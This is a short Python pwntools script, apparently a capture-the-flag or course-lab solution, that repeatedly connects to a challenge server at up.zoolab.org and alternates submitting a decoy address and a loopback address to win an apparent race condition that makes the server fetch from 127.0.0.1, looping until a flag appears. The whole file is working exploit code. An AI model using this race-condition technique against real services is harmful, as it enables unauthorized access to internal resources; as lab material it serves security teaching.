
from pwn import *
import time

target = ('up.zoolab.org', 10932)
payload = "127.0.0.1/10000"
distractor = f"127.0.0.2/10000"

io = remote(*target)

cnt = 0
while(True):
    print(f"Try {cnt}")
    cnt += 1

    io.sendline(b"g")
    io.sendline(distractor.encode())
    io.sendline(b"g")
    io.sendline(payload.encode())
    
    io.recvuntil(b"What do you want to do? ")
    io.recvuntil(b"What do you want to do? ")

    io.recvuntil(b"What do you want to do? ")
    io.sendline(b"v")
    res = io.recvuntil(b"==== Menu ====", timeout=5)
    output = res.decode(errors='ignore')
    print(output)   
    if "FLAG" in output:
        io.close()
        break
    time.sleep(1)

